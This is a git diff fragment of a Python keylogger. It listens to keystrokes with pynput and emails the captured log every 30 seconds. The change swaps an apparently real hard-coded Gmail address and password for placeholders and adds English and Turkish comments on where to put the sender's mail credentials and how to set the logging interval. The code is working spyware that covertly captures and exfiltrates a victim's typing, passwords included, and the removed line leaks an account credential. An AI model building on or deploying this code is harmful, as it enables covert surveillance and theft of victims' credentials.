@@ -40,9 +40,9 @@ def send_email(email,password,message):
 
 def thread_function():
     global log
-    send_email("crazycali598@gmail.com", "maraba123", log)
+    send_email("@gmail.com", "password", log) #Mail address and password - Mail adresi ve şifre.
     log = ""
-    timer_object = threading.Timer(30,thread_function)
+    timer_object = threading.Timer(30,thread_function) #Choose how many seconds you want to log - Kaç saniye boyunca log toplayacağını belirle.
     timer_object.start()
 
 keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
